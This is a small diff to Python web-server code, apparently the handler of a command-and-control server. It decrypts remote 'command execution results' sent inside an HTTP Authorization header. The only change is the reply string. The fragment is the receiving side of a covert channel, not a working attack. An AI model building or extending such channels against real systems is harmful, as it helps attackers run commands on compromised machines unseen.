@@ -134,7 +134,7 @@ def cr():
         #if request.method == "POST":
         encrypted_response = request.headers["Authorization"]
         print "\nCommand execution result is : \n" + decrypt_command(aes_encryption_key, encrypted_response).strip("\x00") + "\n"
-        return "a7a"
+        return "Done"
 
         #else:
         #    return "A"
